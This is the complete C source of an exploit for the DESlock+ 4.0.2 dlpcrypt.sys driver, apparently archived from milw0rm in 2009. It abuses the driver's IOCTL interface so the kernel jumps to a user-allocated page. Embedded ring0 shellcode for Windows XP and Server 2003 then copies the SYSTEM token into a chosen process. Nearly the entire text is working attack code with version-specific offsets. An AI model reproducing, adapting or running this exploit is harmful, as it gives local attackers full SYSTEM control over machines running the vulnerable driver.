<html><head><title>DESlock+ 4.0.2 dlpcrypt.sys Local Kernel ring0 Code Execution Exploit</title></head><pre>/* deslock-dlpcrypt.c
 *
 * Copyright (c) 2009 by &lt;mu-b@digit-labs.org&gt;
 *
 * DESlock+ 4.0.2 local kernel SYSTEM exploit
 * by mu-b - Thu 18 Jun 2009
 *
 * - Tested on: dlpcrypt.sys 0.1.1.27
 *
 * .text:0001BB2E: 'what do ya want for nothing?'
 *  - hmmm, something that doesn't pass kernel mode pointers
 *    between kernel and userland?
 *
 * Compile: MinGW + -lntdll
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2009!@$!
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#include &lt;windows.h&gt;

#define DLPCRYPT_IOCTL_ENABLED  0x8001200C
#define DLPCRYPT_IOCTL_ADD      0x80012004
#define DLPCRYPT_IOCTL_PROCESS  0x80012010

#define DLPCRYPT_FLAG1          0x13B45FA8
#define DLPCRYPT_FLAG2          0xBFD294C9

static unsigned char win32_fixup[] =
  &quot;\x56&quot;;

/* Win2k3 SP1/2 - kernel EPROCESS token switcher
 * by mu-b &lt;mu-b@digit-lab.org&gt;
 */
static unsigned char win2k3_ring0_shell[] =
  /* _ring0 */
  &quot;\xb8\x24\xf1\xdf\xff&quot;
  &quot;\x8b\x00&quot;
  &quot;\x8b\xb0\x18\x02\x00\x00&quot;
  &quot;\x89\xf0&quot;
  /* _sys_eprocess_loop   */
  &quot;\x8b\x98\x94\x00\x00\x00&quot;
  &quot;\x81\xfb\x04\x00\x00\x00&quot;
  &quot;\x74\x11&quot;
  &quot;\x8b\x80\x9c\x00\x00\x00&quot;
  &quot;\x2d\x98\x00\x00\x00&quot;
  &quot;\x39\xf0&quot;
  &quot;\x75\xe3&quot;
  &quot;\xeb\x21&quot;
  /* _sys_eprocess_found  */
  &quot;\x89\xc1&quot;
  &quot;\x89\xf0&quot;

  /* _cmd_eprocess_loop   */
  &quot;\x8b\x98\x94\x00\x00\x00&quot;
  &quot;\x81\xfb\x00\x00\x00\x00&quot;
  &quot;\x74\x10&quot;
  &quot;\x8b\x80\x9c\x00\x00\x00&quot;
  &quot;\x2d\x98\x00\x00\x00&quot;
  &quot;\x39\xf0&quot;
  &quot;\x75\xe3&quot;
  /* _not_found           */
  &quot;\xcc&quot;
  /* _cmd_eprocess_found
   * _ring0_end           */

  /* copy tokens!$%!      */
  &quot;\x8b\x89\xd8\x00\x00\x00&quot;
  &quot;\x89\x88\xd8\x00\x00\x00&quot;
  &quot;\x90&quot;;

static unsigned char winxp_ring0_shell[] =
  /* _ring0 */
  &quot;\xb8\x24\xf1\xdf\xff&quot;
  &quot;\x8b\x00&quot;
  &quot;\x8b\x70\x44&quot;
  &quot;\x89\xf0&quot;
  /* _sys_eprocess_loop   */
  &quot;\x8b\x98\x84\x00\x00\x00&quot;
  &quot;\x81\xfb\x04\x00\x00\x00&quot;
  &quot;\x74\x11&quot;
  &quot;\x8b\x80\x8c\x00\x00\x00&quot;
  &quot;\x2d\x88\x00\x00\x00&quot;
  &quot;\x39\xf0&quot;
  &quot;\x75\xe3&quot;
  &quot;\xeb\x21&quot;
  /* _sys_eprocess_found  */
  &quot;\x89\xc1&quot;
  &quot;\x89\xf0&quot;

  /* _cmd_eprocess_loop   */
  &quot;\x8b\x98\x84\x00\x00\x00&quot;
  &quot;\x81\xfb\x00\x00\x00\x00&quot;
  &quot;\x74\x10&quot;
  &quot;\x8b\x80\x8c\x00\x00\x00&quot;
  &quot;\x2d\x88\x00\x00\x00&quot;
  &quot;\x39\xf0&quot;
  &quot;\x75\xe3&quot;
  /* _not_found           */
  &quot;\xcc&quot;
  /* _cmd_eprocess_found
   * _ring0_end           */

  /* copy tokens!$%!      */
  &quot;\x8b\x89\xc8\x00\x00\x00&quot;
  &quot;\x89\x88\xc8\x00\x00\x00&quot;
  &quot;\x90&quot;;

static unsigned char win32_ret[] =
  &quot;\x5e&quot;
  &quot;\x58&quot;
  &quot;\x58&quot;
  &quot;\x33\xc0&quot;
  &quot;\x5e&quot;
  &quot;\x5d&quot;
  &quot;\xc2\x0c\x00&quot;;

struct ioctl_req_enable {
  int flag[2];
  int len;
  int result;
  int enabled;
  char pad[0x38 - 0x14];
};

struct ioctl_req {
  int flag[2];
  int len;
  int result;
  int action;
  struct ioctl_ptr *ptr;
  char pad[0x38 - 0x18];
};

struct ioctl_ptr {
  char pad[0x8];
  struct ioctl_pid *ppid;
  int action;
  char _pad[0x4];
  struct ioctl_func *func;
};

struct ioctl_pid {
  char pad[0x14];
  DWORD pid;
};

struct ioctl_func {
  void *func_ptr;
};

static PCHAR
fixup_ring0_shell (DWORD ppid, DWORD *zlen)
{
  DWORD dwVersion, dwMajorVersion, dwMinorVersion;

  dwVersion = GetVersion ();
  dwMajorVersion = (DWORD) (LOBYTE(LOWORD(dwVersion)));
  dwMinorVersion = (DWORD) (HIBYTE(LOWORD(dwVersion)));

  if (dwMajorVersion != 5)
    {
      fprintf (stderr, &quot;* GetVersion, unsupported version\n&quot;);
      exit (EXIT_FAILURE);
    }

  switch (dwMinorVersion)
    {
      case 1:
        *zlen = sizeof winxp_ring0_shell - 1;
        *(PDWORD) &amp;winxp_ring0_shell[55] = ppid;
        return (winxp_ring0_shell);

      case 2:
        *zlen = sizeof win2k3_ring0_shell - 1;
        *(PDWORD) &amp;win2k3_ring0_shell[58] = ppid;
        return (win2k3_ring0_shell);

      default:
        fprintf (stderr, &quot;* GetVersion, unsupported version\n&quot;);
        exit (EXIT_FAILURE);
    }

  return (NULL);
}

int
main (int argc, char **argv)
{
  struct ioctl_req_enable req_enable;
  struct ioctl_req req;
  struct ioctl_ptr ptr;
  struct ioctl_pid pid;
  struct ioctl_func func;
  LPVOID c_addr, zpage, zbuf;
  DWORD rlen, zlen, ppid;
  HANDLE hFile;
  BOOL bResult;

  printf (&quot;DESlock+ 4.0.2 local kernel SYSTEM exploit\n&quot;
          &quot;by: &lt;mu-b@digit-labs.org&gt;\n&quot;
          &quot;http://www.digit-labs.org/ -- Digit-Labs 2009!@$!\n\n&quot;);

  if (argc &lt;= 1)
    {
      fprintf (stderr, &quot;Usage: %s &lt;processid to elevate&gt;\n&quot;, argv[0]);
      exit (EXIT_SUCCESS);
    }

  ppid = atoi (argv[1]);

  hFile = CreateFileA (&quot;\\\\.\\DLPCryptCore&quot;, FILE_EXECUTE,
                       FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
                       OPEN_EXISTING, 0, NULL);
  if (hFile == INVALID_HANDLE_VALUE)
    {
      fprintf (stderr, &quot;* CreateFileA failed, %d\n&quot;, hFile);
      exit (EXIT_FAILURE);
    }

  zpage = VirtualAlloc (NULL, 0x10000, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (zpage == NULL)
    {
      fprintf (stderr, &quot;* VirtualAlloc failed\n&quot;);
      exit (EXIT_FAILURE);
    }
  printf (&quot;* allocated page: 0x%08X [%d-bytes]\n&quot;,
          zpage, 0x10000);

  memset (zpage, 0xCC, 0x10000);
  zbuf = fixup_ring0_shell (ppid, &amp;zlen);
  memcpy (zpage, win32_fixup, sizeof (win32_fixup) - 1);
  memcpy (zpage + sizeof (win32_fixup) - 1, zbuf, zlen);
  memcpy (zpage + sizeof (win32_fixup) + zlen - 1,
          win32_ret, sizeof (win32_ret) - 1);

  memset (&amp;req_enable, 0, sizeof req_enable);
  req_enable.flag[0] = DLPCRYPT_FLAG1;
  req_enable.flag[1] = DLPCRYPT_FLAG2;
  req_enable.len = sizeof req_enable;

  printf (&quot;* verifying context... &quot;);
  bResult = DeviceIoControl (hFile, DLPCRYPT_IOCTL_ENABLED,
                             &amp;req_enable, sizeof req_enable,
                             &amp;req_enable, sizeof req_enable, &amp;rlen, 0);
  if (!bResult)
    {
      fprintf (stderr, &quot;* DeviceIoControl failed\n&quot;);
      exit (EXIT_FAILURE);
    }
  printf (&quot;result: %d, enabled: %d\n&quot;, req_enable.result, req_enable.enabled);

  printf (&quot;* adding pid [%d]... &quot;, GetCurrentProcessId ());
  bResult = DeviceIoControl (hFile, DLPCRYPT_IOCTL_ADD,
                             &amp;req_enable, sizeof req_enable,
                             &amp;req_enable, sizeof req_enable, &amp;rlen, 0);
  if (!bResult)
    {
      fprintf (stderr, &quot;* DeviceIoControl failed\n&quot;);
      exit (EXIT_FAILURE);
    }
  printf (&quot;done\n&quot;);

  memset (&amp;req, 0, sizeof req);
  req.flag[0] = DLPCRYPT_FLAG1;
  req.flag[1] = DLPCRYPT_FLAG2;
  req.len = sizeof req;
  req.action = 2;
  req.ptr = &amp;ptr;

  memset (&amp;ptr, 0, sizeof ptr);
  ptr.ppid = &amp;pid;
  ptr.action = 2;
  ptr.func = &amp;func;

  memset (&amp;pid, 0, sizeof pid);
  pid.pid = GetCurrentProcessId ();

  memset (&amp;func, 0, sizeof func);
  func.func_ptr = &amp;c_addr;

  c_addr = (LPVOID) zpage;

  printf (&quot;* req.ptr: 0x%08X\n&quot;, &amp;ptr);
  printf (&quot;* @0x%08X: ppid_ptr: 0x%08X, func_ptr:  0x%08X\n&quot;,
          &amp;ptr, ptr.ppid, ptr.func);
  printf (&quot;* @0x%08X: func_ptr: 0x%08X\n&quot;, ptr.func, func.func_ptr);
  printf (&quot;* @0x%08X: func_ptr: 0x%08X\n&quot;, &amp;c_addr, c_addr);

  /* jump to our address :) */
  printf (&quot;* jumping.. &quot;);
  bResult = DeviceIoControl (hFile, DLPCRYPT_IOCTL_PROCESS,
                             &amp;req, sizeof req, &amp;req, sizeof req, &amp;rlen, 0);
  if (!bResult)
    {
      fprintf (stderr, &quot;* DeviceIoControl failed\n&quot;);
      exit (EXIT_FAILURE);
    }
  printf (&quot;done\n\n&quot;
          &quot;* hmmm, you didn't STOP the box?!?!\n&quot;);

  CloseHandle (hFile);

  return (EXIT_SUCCESS);
}

// milw0rm.com [2009-06-18]</pre></html>